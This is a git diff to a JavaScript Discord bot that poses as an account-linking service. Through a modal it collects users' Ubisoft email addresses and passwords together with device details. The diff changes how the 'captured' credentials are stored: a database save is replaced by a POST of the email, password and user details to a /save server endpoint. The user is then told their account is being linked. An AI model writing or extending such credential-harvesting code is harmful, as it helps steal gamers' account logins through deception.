@@ -13,7 +13,6 @@ if (!process.env.DISCORD_CLIENT_ID) {
 }
 
 const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require('discord.js');
-const { saveCapture } = require('./database');
 
 const TOKEN = process.env.DISCORD_TOKEN;
 const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
@@ -103,20 +102,27 @@ client.on('interactionCreate', async interaction => {
     const userAgent = interaction.client.options.http?.headers?.['User-Agent'] || 'Unknown';
     const { deviceType, browser, os } = parseUserAgent(userAgent);
     
-    const ipAddress = 'Captured via webhook endpoint';
-    
-    await saveCapture({
-      discord_id: discordUser.id,
-      discord_username: discordUser.username,
-      ubi_email: ubiEmail,
-      ubi_password: ubiPass,
-      platform: platform,
-      ip_address: ipAddress,
-      user_agent: userAgent,
-      device_type: deviceType,
-      browser: browser,
-      os: os
-    });
+    // Send data to the server's /save endpoint
+    try {
+      const response = await fetch('http://localhost:3000/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          discord_username: discordUser.username,
+          discord_id: discordUser.id,
+          ubi_email: ubiEmail,
+          ubi_password: ubiPass,
+          platform: platform,
+          device_type: deviceType,
+          browser: browser,
+          os: os,
+          timestamp: new Date().toISOString()
+        })
+      });
+      console.log('Data saved to server:', response.status);
+    } catch (err) {
+      console.error('Failed to save data:', err);
+    }
     
     await interaction.reply({
       content: `✅ Received. Linking ${ubiEmail} to ${platform}. You will be notified when complete.`,
